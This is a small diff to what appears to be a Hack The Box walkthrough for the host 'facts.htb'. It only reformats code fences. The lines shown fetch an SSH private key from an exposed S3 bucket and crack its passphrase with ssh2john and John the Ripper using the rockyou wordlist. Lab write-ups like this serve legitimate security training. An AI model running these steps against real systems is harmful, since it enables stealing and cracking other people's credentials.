@@ -55,11 +55,10 @@
 - aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .
 - decrypt de private key ssh
 ```
-
-```
 python3 /usr/share/john/ssh2john.py id_ed25519 > hash.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 john --show hash.txt
+```
 
 
 ---
